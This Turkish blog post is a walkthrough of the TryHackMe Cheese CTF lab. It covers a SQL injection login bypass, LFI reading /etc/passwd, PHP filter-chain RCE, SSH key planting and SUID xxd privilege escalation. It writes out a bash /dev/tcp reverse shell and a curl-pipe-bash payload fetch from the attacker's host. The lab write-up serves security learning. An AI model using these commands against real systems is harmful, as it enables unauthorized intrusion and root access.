---
categories: [makine]
layout: post
title: TryHackMe Cheese CTF
description: "Cheese, sizi lezzetli ama tehlikeli bir web sunucusuna götürüyor. Amacınız? Güvenlik açıklarını kullanarak sistemdeki dijital peynir tuzaklarını aşmak ve tüm bayrakları toplamak. "
logo: "/assets/images/cheese_ctf.png"
tags: [TryHackMe, SQLi]
order: 3
author: nazy
translation_url: /en/Tryhackme_CheeseCTF
---
## Port Taraması

Makine IP adresi: 10.10.87.129

Makine hakkında bilgi toplamak için nmap ile port taraması yaparak başlıyoruz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/port.webp' | relative_url }}" width="300" height="600" alt="Nmap ile yapılan port taramasının terminal çıktısı">
</div>
80 portunun açık olduğunu gördük tarayıcı üzerinden sayfaya gidelim. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/web.webp' | relative_url }}" width="400" height="300" alt="80 portundaki web sunucusunun tarayıcıda görüntülenen ana sayfası">
</div>
Sayfada dolaşırken bir de login sayfası olduğunu görüyoruz. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/login.webp' | relative_url }}" width="400" height="300" alt="Web uygulamasının kullanıcı giriş (login) sayfası">
</div>

## SQLi

Login sayfası üzerinden SQLi saldırısı yaparak giriş yapmayı deneyelim. Ben bu işlemi BurpSuite üzerinden bir wordlist ile yapmak istedim. BurpSuite uygulamasını açalım. Login sayfasından POST isteğini yakalayalım.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sqli.webp' | relative_url }}" width="600" height="400" alt="Burp Suite ile yakalanan login sayfası POST isteği">
</div>
Paketi yakaladıktan sonra “Send to Intruder” seçeneğini seçelim. Böylece istediğimiz parametre üzerinde deneme yapabilelim. Intruder üzerinde “username” parametresi üzerinde denemeler yapacağım için username değerini seçip Add butonuna tıklıyorum. Ekran görüntüsündeki sarı işaretli alan. Daha iyi anlayabilirsiniz.  
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/intruder.webp' | relative_url }}" width="600" height="400" alt="Burp Suite Intruder'da username parametresinin işaretlenmesi">
</div>
Bunu seçtikten sonra soldaki menü üzerinde Payload Type seçeneğini ayarlayalım. Ben deneme değerini hazır bir wordlist içinden çekeceğim Runtime File seçeneğini seçtim. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/runti.webp' | relative_url }}" width="800" height="300" alt="Intruder'da Payload Type olarak Runtime File seçilmesi">
</div>
Start Attack dedikten sonra saldırımız başlıyor. Wordlistin büyüklüğüne göre saldırı süresi uzuyor. Bir süre sonra başarılı giriş değerini buluyoruz. Benim wordlistimde ilk bulduğum sonuç “'||2—2” olduğu için bu değeri kullanacağım. Login sayfasında username olarak “'||2—2” password olarak ise herhangi bir tuşa basıp giriş yapıyorum.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/logsql.webp' | relative_url }}" width="400" height="300" alt="SQL injection payload'ı ile login sayfasına başarılı giriş">
</div>
Giriş yaptıktan sonra bizi bir panel karşılıyor. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/panel.webp' | relative_url }}" width="700" height="250" alt="Girişten sonra erişilen yönetim panelinin ekran görüntüsü">
</div>
Sayfanın URL adresi dikkatimi çekiyor. Bu URL sayfanın php dosyalarını kabul ettiğini ve file parametresi ile dinamik olarak içerik yüklediğini gösteriyor.

## LFI

File parametresinin olduğu yere basit bir LFI payload’ı deneyelim. Bu değeri “../../../../../../etc/passwd”  file parametresinden sonra dosya yolu olarak belirtirsek belki kullanıcı listesini elde edebiliriz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/lfi.webp' | relative_url }}" width="900" height="150" alt="LFI payload'ı ile /etc/passwd dosyasının görüntülenmesi">
</div>
Bingo LFI kodu çalışıyor ve kullanıcıları çekebildik. Elimizde iki tane önemli kullanıcı var. Birinci Root hesabı ikinci ise “comte” isimli bir kullanıcı hesabı. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/shdw.webp' | relative_url }}" width="900" height="250" alt="/etc/passwd çıktısında root ve comte kullanıcılarının görülmesi">
</div>
## LFI to RCE

PHP, stream wrapper adı verilen mekanizmalar kullanarak dosyaları ve verileri farklı şekillerde okuyup işleyebilir. Bu kütüphane sayesinde yazılımcılar işlerini daha kolay halledebilirler. Fakat LFI zafiyeti ile birleştirilip kullanılabilir.

Bizim makinemizde de filter chain dediğimiz yöntemi kullanarak uzaktan kod çalıştırmaya çalışacağız. Bu yöntemi ben [bu](https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/) kaynağı kullanarak gerçekleştirdim.

**Step 1**

Kali makineme  [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git) reposunu kurdum.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> git clone [https://github.com/synacktiv/php\_filter\_chain\_generator.git](https://github.com/synacktiv/php_filter_chain_generator.git)
</div>


**Step 2**

Kali makinemiz üzerinde “revshell” isimli bir shell oluşturuyoruz.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> echo 'bash -i >& /dev/tcp/10.9.0.127/4444 0>&1' > revshell
</div>

Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çalıştırmayı gerçekleştireceğiz. O yüzden kendi IP adresimizi (VPN ile bağlandıysanız VPN IP adresinizi) / sembolünden sonra da dinleme yapmak istediğiniz portu seçiyorsunuz. Aynı klasör üstünde python server’ını başlatarak shell’i erişilebilir hale getirelim. 
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> sudo python3 -m http.server 80
</div>

**Step 3**

Shell’i oluşturup erişilebilir hale getirdikten sonra kurban sistem URL’sine, indirdiğimiz aracı kullanarak filter chain oluşturalım.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '?= \`curl -s -L 10.9.0.127/revshell|bash\` ?'
</div>

Bunun çıktısındaki uzun satırları kopyalayalım 5. Adımda bu çıktıları kopyalayacağız.

**Step 4**

Dinleyicimizi başlatalım.
<div class="code-window">
<br>
<span class="highlight">nzy@kali$</span> nc -lvnp 4444
</div>

**Step 5**

3\. adımda kopyaladığımız çıktıyı şimdi tarayıca yerine yerleştirme vakti. Kırmızıyla işaretli yere kendi çıktımızı yazalım.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/url.webp' | relative_url }}" width="1000" height="60" alt="PHP filter chain çıktısının tarayıcı URL'sine yerleştirilmesi">
</div>
**Step 6**

Netcat ile dinlediğiniz terminale dönerek shell’e ulaşabilirsiniz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/shell.webp' | relative_url }}" width="400" height="360" alt="Netcat dinleyicisi üzerinden elde edilen ters shell bağlantısı">
</div>

## Privilege Escalation

Sisteme erişim sağladıktan sonra “comte” kullanıcının home klasörünü erişebildik.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/comte.webp' | relative_url }}" width="400" height="100" alt="Comte kullanıcısının home dizinindeki dosyaların listelenmesi">
</div>
Fakat buradaki user.txt dosyasını görüntülemeye çalıştığımızda “Permission Denied” hatası aldık. Bunun için biraz daha bakınmaya karar verdik. Ls -al komutu ile gizli klasörlere bakalım. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/ls.webp' | relative_url }}" width="600" height="300" alt="ls -al komutuyla gizli .ssh klasörünün görüntülenmesi">
</div>
Buradaki .ssh dosyasını inceleyebiliriz. .ssh klasörü içinde izin verilen ssh anahtarlarının dosyasını bulduk. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/key.webp' | relative_url }}" width="500" height="80" alt=".ssh klasöründeki authorized_keys dosyasının izinleri ve içeriği">
</div>
Bu dosyanın izinlerini görüntülediğimizde ise dosyanın herkes tarafından okunulur ve yazılabilir olduğunu öğreniyoruz. O zaman bir sonraki adımımız kendi ssh anahtarımızı oluşturarak sisteme comte kullanıcısı üzerinden erişim sağlamak. 
Kendi Kali makinemiz üzerinde ssh-keygen aracını kullanarak kendi anahtarımızı oluşturalım. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/ssh-keygen.webp' | relative_url }}" width="560" height="360" alt="ssh-keygen komutuyla SSH anahtar çiftinin oluşturulması">
</div>
Anahtarı oluşturduktan sonra oluşturulduğu yere giderek public olan anahtarı kopyalayalım. 
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/public.webp' | relative_url }}" width="800" height="200" alt="Oluşturulan public SSH anahtarının terminalde görüntülenmesi">
</div>
Kopyaladığımız değeri kurbanın sistemi üzerindeki .ssh/authorized\_keys dosyasına ekleyerek sistemin bize güvenmesini sağlayacağız. Böylece comte kullanıcısına ssh üzerinden bağlanabileceğiz.

Shell terminale geri dönelim ve ssh anahtarını dosyaya ekleyelim.

·        echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINoaiZgti9CA7VtKc8G6LUaUIP9QJL/mO4GT/KSWI1Sg root@kali" > /home/comte/.ssh/authorized\_keys

Ekledikten sonra kendi Kali makinemiz üzerinde ssh comte@ip\_adress komutu ile giriş yapabiliriz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/user.webp' | relative_url }}" width="400" height="500" alt="SSH ile comte kullanıcısı olarak sisteme bağlanma">
</div>
Böylece ilk bayrağımız olan user.txt elde ediyoruz.

## Comte to Root

Comte kullanıcısı üzerinden root kullanıcısına erişmek için ilk öncelikle bu kullanıcının yetkilerine bakalım.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/sudo.webp' | relative_url }}" width="600" height="150" alt="sudo -l komutunun comte kullanıcısı için gösterdiği yetkiler">
</div>
Burada gördüğümüz dosyalar ile ne yapabileceğimize baktım. Exploit.timer dosyası exploit.server isimli dosyayı triggerlayarak başlatabiliyor. Peki bu exploit.service isimli dosyanın içeriği ne ki bize root yetkisi kazandırabilsin?

·        nano /etc/systemd/system/exploit.service
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/service.webp' | relative_url }}" width="700" height="130" alt="exploit.service dosyasının nano ile görüntülenen içeriği">
</div>
Bu kod, xxd programının kopyasını /opt klasörüne taşıyor. Sonrasında ile ona +sx özelliği veriyor yani artık kim çalıştırırsa çalıştırsın Root gibi davranabiliyor. Bu service dosyasının çalıştırılmasının tetiklenmesi için bir de exploit.timer dosyamız var. Bu dosyayı da düzenleyerek çalıştırabiliriz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/unit.webp' | relative_url }}" width="330" height="260" alt="exploit.timer dosyasının OnBootSec ayarıyla düzenlenmiş içeriği">
</div>
OnBootSec ile çalıştırılma süresini ayarlıyoruz. Ayarladıktan sonra yeni dosyayı sisteme okutmak için bu komutu:

·        sudo systemctl daemon-reload

exploit.timer zamanlayıcısını başlatmak için ise bu komutu kullandık:

·        sudo systemctl start exploit.timer

Böylece zamanlayıcı başladıktan 4 saniye sonra exploit.service dosyası çalışacak. Dosyanın çalıştığını doğrulamak için ls -l /opt/xxd komutu ile dosyanı yetkilerini görüntüleyebiliriz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/opt.webp' | relative_url }}" width="600" height="60" alt="ls -l /opt/xxd komutunun SUID bitini gösteren çıktısı">
</div>
Buradaki -s yani SUID, bir kullanıcı onu çalıştırdığında o dosya çalıştırıldığı kullanıcının yetkileriyle değil, dosya sahibinin yetkileriyle çalışır. Yani biz comte olarak dosyayı çalıştıracağız fakat root kullanıcısının yetkisiyle çalışmış olacak.

Root kullanıcısının sahip olduğu root.txt dosyasını ise şu komut ile görüntüleyebiliriz.

·        /opt/xxd /root/root.txt | xxd -r

/opt/xxd aracı verdiğimiz /root/root.txt dosyasını hex şeklinde ekrana yazdırır. Ancak bu format bizim için okunabilirliği olmadığı için bunu da | xxd -r komutu ile normal yazıya çeviririz. Bu komut hakkında daha fazla bilgiyi [bu](https://gtfobins.github.io/gtfobins/xxd/) adres üzerinden okuyabilirsiniz.
<div style="text-align: center;">
  <img loading="lazy" src="{{ '/assets/images/tryhackme_cheesectf/root.webp' | relative_url }}" width="600" height="220" alt="/opt/xxd aracıyla elde edilen root.txt bayrağının içeriği">
</div>
## Notlar

Ssh-keygen

Linux sistemlerde şifrelenmiş anahtar çifti üretmek için kullanılan bir araçtır.

·        **Private key**: Gizlidir, kimseyle paylaşılmaz.

·        **Public key**: Uzak sunucuya verilir

### Xxd

Bir ikili dosyayı veya metni hex formatta gösteren bir komuttur. -r parametresi ile hex’i normal yazıya çevirebilirsiniz.

### SUID

Normalde bir program çalıştığında, o anki kullanıcının yetkilerine sahiptir fakat program SUID bite sahipse çalıştırıldığında sahibinin yetkileri ile çalışır.

·        ls -l /usr/bin/passwd

gibi komutlarla programın yetkileri kontrol edilebilir.
